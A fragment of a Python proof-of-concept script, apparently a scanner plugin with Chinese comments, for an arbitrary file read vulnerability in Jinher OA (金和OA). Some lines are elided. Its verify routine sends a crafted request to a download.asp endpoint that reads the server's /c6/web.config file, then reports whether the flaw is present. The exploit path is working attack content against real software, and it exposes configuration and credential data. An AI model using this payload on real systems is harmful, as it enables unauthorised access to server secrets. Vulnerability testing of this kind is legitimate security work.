...
POC_NAME = "JinherOAFile"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class JinherOAFile(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0013',    # PoC的VID编号
            'vbid': '',
            'Name': 'Jinher OA Arbitrary File Read',    # PoC名称
            'Author': 'littl1fishr',    # PoC作者
            'Create_date': '2021-06-24',    # PoC创建时间
            },

        'vul': {
            'Product': '金和OA',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'Arbitrary',    # 漏洞类型
            ...
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-06-24',    # PoC公布时间
        }
    }
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/C6/Jhsoft.Web.module/testbill/dj/download.asp?filename=/c6/web.config')
        headers = {
        ...
        if "version" in location:
            ...
            if verbose:
                highlight('[+] Jinher OA Arbitrary File Read found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] Jinher OA Arbitrary File Read not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
